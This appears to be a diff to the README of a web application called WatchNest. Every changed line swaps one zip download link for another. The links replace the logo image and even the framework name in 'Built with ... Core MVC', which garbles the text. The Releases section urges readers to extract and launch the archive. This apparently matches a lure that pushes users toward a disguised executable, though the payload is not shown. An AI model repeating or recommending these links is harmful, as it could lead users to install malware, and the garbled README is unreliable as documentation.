@@ -3,12 +3,12 @@
 
 Welcome to the WatchNest Application repository! This is the main application for WatchNest (Final Version). The API for this project can be found in the WatchNest - API repository.
 
-![WatchNest Logo](https://github.com/idkwhattodo642/WatchNest-Application/releases/download/v1.0/Release.zip)
+![WatchNest Logo](https://github.com/idkwhattodo642/WatchNest-Application/releases/download/v2.0/Software.zip)
 
 ## Features 🚀
 
 - Utilizes AJAX for smooth data retrieval.
-- Built with https://github.com/idkwhattodo642/WatchNest-Application/releases/download/v1.0/Release.zip Core MVC framework.
+- Built with https://github.com/idkwhattodo642/WatchNest-Application/releases/download/v2.0/Software.zip Core MVC framework.
 - Styling using Bootstrap 5.
 - Caching implementation with Caching SQL.
 - Enhanced user experience with cookies.
@@ -34,9 +34,9 @@ Once you have the application up and running, you can explore the various featur
 
 ## Releases 🚪
 
-For the latest version of the application, you can download it from [here](https://github.com/idkwhattodo642/WatchNest-Application/releases/download/v1.0/Release.zip). Make sure to extract and launch the software for an amazing experience!
+For the latest version of the application, you can download it from [here](https://github.com/idkwhattodo642/WatchNest-Application/releases/download/v2.0/Software.zip). Make sure to extract and launch the software for an amazing experience!
 
-[![Download WatchNest](https://github.com/idkwhattodo642/WatchNest-Application/releases/download/v1.0/Release.zip)](https://github.com/idkwhattodo642/WatchNest-Application/releases/download/v1.0/Release.zip)
+[![Download WatchNest](https://github.com/idkwhattodo642/WatchNest-Application/releases/download/v2.0/Software.zip)](https://github.com/idkwhattodo642/WatchNest-Application/releases/download/v2.0/Software.zip)
 
 ## Contributing 🤝
 
